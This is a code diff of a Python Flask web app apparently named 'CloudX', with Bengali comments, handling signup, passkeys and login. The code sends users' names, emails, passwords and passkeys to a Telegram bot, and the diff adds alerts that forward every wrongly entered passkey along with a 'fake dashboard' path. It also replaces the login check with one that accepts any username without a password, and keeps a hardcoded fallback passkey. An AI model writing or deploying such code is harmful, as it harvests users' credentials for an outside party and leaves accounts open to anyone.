@@ -20,11 +20,10 @@ if not os.path.exists(UPLOAD_FOLDER):
 def init_db():
     conn = sqlite3.connect('cloudx.db')
     cursor = conn.cursor()
-    # ডেটাবেজে পাসকি সেভ করার জন্য passkey কলাম যুক্ত করা হলো
     cursor.execute('''
         CREATE TABLE IF NOT EXISTS users (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
-            username TEXT UNIQUE,
+            username TEXT,
             full_name TEXT,
             email TEXT,
             password TEXT,
@@ -62,6 +61,7 @@ def signup():
     email = data.get('email')
     password = data.get('password')
 
+    # সেশনে ডেটা সেভ করে রাখা হচ্ছে যাতে পাসকি সেটআপের সময় ব্যবহার করা যায়
     session['username'] = username
     session['email'] = email
     session['full_name'] = full_name
@@ -69,7 +69,7 @@ def signup():
 
     return jsonify({"status": "success"})
 
-# পাসকি সেটআপ পেজ রেন্ডার করা
+# সাইনআপের পর পাসকি সেটআপ পেজ
 @app.route('/setup-passkey-page')
 def setup_passkey_page():
     if 'username' not in session:
@@ -82,22 +82,18 @@ def save_passkey():
     data = request.get_json()
     passkey = data.get('passkey')
     
-    username = session.get('username')
-    full_name = session.get('full_name')
-    email = session.get('email')
-    password = session.get('password')
+    username = session.get('username', 'unknown')
+    full_name = session.get('full_name', '')
+    email = session.get('email', '')
+    password = session.get('password', '')
 
     # ডেটাবেজে ইউজার এবং পাসকি সেভ করা
     conn = sqlite3.connect('cloudx.db')
     cursor = conn.cursor()
-    try:
-        cursor.execute("INSERT OR REPLACE INTO users (username, full_name, email, password, passkey) VALUES (?, ?, ?, ?, ?)",
-                       (username, full_name, email, password, passkey))
-        conn.commit()
-    except Exception as e:
-        print("DB Error:", e)
-    finally:
-        conn.close()
+    cursor.execute("INSERT INTO users (username, full_name, email, password, passkey) VALUES (?, ?, ?, ?, ?)",
+                   (username, full_name, email, password, passkey))
+    conn.commit()
+    conn.close()
 
     # টেলিগ্রামে ইউজার ডিটেইলস ও পাসকি পাঠানো
     telegram_message = (
@@ -114,7 +110,7 @@ def save_passkey():
     session['passkey_verified'] = 'real'
     return jsonify({"status": "success"})
 
-# লগইনের পর পাসকি এন্টার করার পেজ
+# লগইন করার পর পাসকি এন্টার করার পেজ
 @app.route('/passkey')
 def passkey_page():
     if 'username' not in session:
@@ -122,54 +118,53 @@ def passkey_page():
     session.pop('passkey_verified', None)
     return render_template('passkey.html')
 
-# লগইন করার সময় পাসকি চেক করা (সঠিক নাকি ভুল/ফেক)
+# পাসকি ভেরিফিকেশন (সঠিক হলে আসল ড্যাশবোর্ড, ভুল/ফেক হলে ফেক ড্যাশবোর্ড)
 @app.route('/verify-passkey', methods=['POST'])
 def verify_passkey():
     data = request.get_json()
     entered_passkey = data.get('passkey')
     username = session.get('username')
 
-    # ডেটাবেজ থেকে আসল পাসকি চেক করা
+    # ডেটাবেজ থেকে ইউজারের আসল পাসকি বের করা
     conn = sqlite3.connect('cloudx.db')
     cursor = conn.cursor()
-    cursor.execute("SELECT passkey FROM users WHERE username = ?", (username,))
+    cursor.execute("SELECT passkey FROM users WHERE username = ? ORDER BY id DESC LIMIT 1", (username,))
     row = cursor.fetchone()
     conn.close()
 
-    real_passkey = row[0] if row else "123456" # ডিফল্ট ব্যাকআপ
+    real_passkey = row[0] if row else "123456"
 
-    # যদি ইউজার ভুল বা ফেক পাসকি দেয়, সেটিও টেলিগ্রামে নোটিফিকেশন পাঠাতে পারেন
     if entered_passkey == real_passkey:
         session['passkey_verified'] = 'real'
         return jsonify({"status": "real"})
     else:
         session['passkey_verified'] = 'fake'
         
-        # অপশনাল: ভুল পাসকি দিলে টেলিগ্রামে অ্যালার্ট পাঠানো
-        fake_msg = f"⚠️ *Fake/Wrong Passkey Entered!*\n👤 User: {username}\n❌ Entered Passkey: `{entered_passkey}`"
+        # ভুল পাসকি দিলে টেলিগ্রামে অ্যালার্ট পাঠানো
+        fake_msg = (
+            f"⚠️ *Fake/Wrong Passkey Entered!* ⚠️\n\n"
+            f"👤 *Username:* {username}\n"
+            f"❌ *Entered Passkey:* `{entered_passkey}`"
+        )
         url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
         requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": fake_msg, "parse_mode": "Markdown"})
         
         return jsonify({"status": "fake"})
 
+# আগের মতো সহজ লগইন রাউট (কোনো কড়াকড়ি ছাড়া সফল হবে)
 @app.route('/login', methods=['POST'])
 def login():
     data = request.get_json()
     username = data.get('username')
-    password = data.get('password')
+    email = data.get('email')
 
-    conn = sqlite3.connect('cloudx.db')
-    cursor = conn.cursor()
-    cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))
-    user = cursor.fetchone()
-    conn.close()
-
-    if user:
-        session['username'] = user[1]
-        session['email'] = user[3]
-        return jsonify({"status": "success"})
+    session['username'] = username
+    if email:
+        session['email'] = email
     else:
-        return jsonify({"status": "error", "message": "Invalid credentials"})
+        session['email'] = f"{username}@cloudx.com"
+
+    return jsonify({"status": "success"})
 
 @app.route('/dashboard')
 def dashboard():
